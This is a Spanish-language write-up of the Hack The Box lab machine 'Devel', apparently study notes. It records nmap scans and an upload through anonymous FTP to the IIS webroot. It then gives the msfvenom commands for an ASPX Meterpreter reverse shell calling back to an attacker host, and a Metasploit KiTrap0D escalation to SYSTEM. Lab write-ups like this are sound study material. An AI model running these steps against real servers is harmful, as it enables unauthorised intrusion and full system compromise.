---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Easy
  - HTTP
  - FTP
  - ReverseShell
  - LocalExploit
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Enumeración del sistema|Enumeración del sistema]]
	- [[#Enumeración#Enumeración de puertos|Enumeración de puertos]]
	- [[#Enumeración#FTP Anonymous|FTP Anonymous]]
	- [[#Enumeración#HTTP|HTTP]]
- [[#Explotación|Explotación]]
	- [[#Explotación#Reverse Shell|Reverse Shell]]
- [[#Escalada de Privilegios|Escalada de Privilegios]]
	- [[#Escalada de Privilegios#Local Exploit|Local Exploit]]

---
# Devel

![](Screenshots/Pasted%20image%2020260503101559.png)

> Máquina de Hack The Box llamada **[Devel](https://app.hackthebox.com/machines/Devel)**, orientada a la explotación de un servicio FTP mal configurado que permite subida de archivos.
> La intrusión comienza con la enumeración de servicios, donde se identifica acceso anónimo al servidor FTP, permitiendo subir archivos directamente al directorio web.
> Esto facilita la ejecución de una **reverse shell en ASPX**, obteniendo acceso como `iis apppool\web`.
> Finalmente, mediante la explotación de una vulnerabilidad local en el sistema Windows (**MS10-015 - KiTrap0D**), se escalan privilegios hasta **NT AUTHORITY\SYSTEM**, comprometiendo completamente la máquina.

---
## Enumeración
### Enumeración del sistema

```PowerShell
ping -c 1 10.129.31.36
PING 10.129.31.36 (10.129.31.36) 56(84) bytes of data.
64 bytes from 10.129.31.36: icmp_seq=1 ttl=127 time=38.9 ms

--- 10.129.31.36 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 38.938/38.938/38.938/0.000 ms
```

El `TTL=127` indica que probablemente estamos ante un sistema Windows.
### Enumeración de puertos

```PowerShell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.31.36 -oG allPorts
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 127
80/tcp open  http    syn-ack ttl 127
```

```PowerShell
nmap -p21,80 -sCV 10.129.31.36 -oN targeted
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Puertos descubiertos:
- `21 → FTP`
- `80 → HTTP`
### FTP Anonymous

El contenido del `FTP` coincide con los archivos servidos por el sitio web, lo que indica que el directorio `FTP` está directamente vinculado al webroot.  
  
Esto implica que cualquier archivo subido será accesible desde el navegador.

Se prueba a subir el archivo `targeted`, que hemos generado anteriormente para ver si podemos subir archivos para poder realizar una *reverse shell*.

```PowerShell
ftp anonymous@10.129.31.36
ftp> ls
229 Entering Extended Passive Mode (|||49158|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> put targeted 
local: targeted remote: targeted
229 Entering Extended Passive Mode (|||49161|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************************************************************************************************************************************|   930       17.05 MiB/s    --:-- ETA
226 Transfer complete.
930 bytes sent in 00:00 (23.03 KiB/s)
```

Dado que es posible subir archivos al servidor web a través de `FTP`, se puede cargar una web shell en formato ASPX para ejecutar código en el servidor.
### HTTP

```HTTP
http://10.129.31.36/
```

![](Screenshots/Pasted%20image%2020260503102648.png)

---
## Explotación
### Reverse Shell

Se genera una reverse shell en formato ASPX compatible con IIS utilizando msfvenom, permitiendo ejecución remota de comandos en el servidor.

Máquina atacante:

```PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER_IP] LPORT=9001 -f aspx > shell.aspx
ftp anonymous@10.129.31.36
ftp> put shell.aspx

msfconsole -q
use multi/handler
set LHOST [ATTACKER_IP]
set LPORT 9001
exploit
```

Máquina victima:

```HTTP
http://10.129.31.36/shell.aspx
```

Se obtiene acceso como `iis apppool\web`, que corresponde al contexto del servidor web IIS con privilegios limitados.

---
## Escalada de Privilegios
### Local Exploit

Se intenta identificar vulnerabilidades locales mediante `local_exploit_suggester`. Aunque no devuelve resultados fiables, se prueban exploits conocidos para sistemas Windows antiguos.  
  
El exploit `MS10-015 (KiTrap0D)` resulta efectivo, permitiendo escalar privilegios a SYSTEM.

Este exploit aprovecha una vulnerabilidad en el kernel de Windows que permite a usuarios locales escalar privilegios mediante una condición de carrera.

```PowerShell
use exploit/windows/local/ms10_015_kitrap0d
set SESSION 1
exploit
```

Se obtiene una consola interactiva con el usuario `nt authority\system`.

La flag de `usuario` se encuentra en: `C:\Users\babis\Desktop`.

La flag de `root` se encuentra en: `C:\Users\Administrator\Desktop`.

---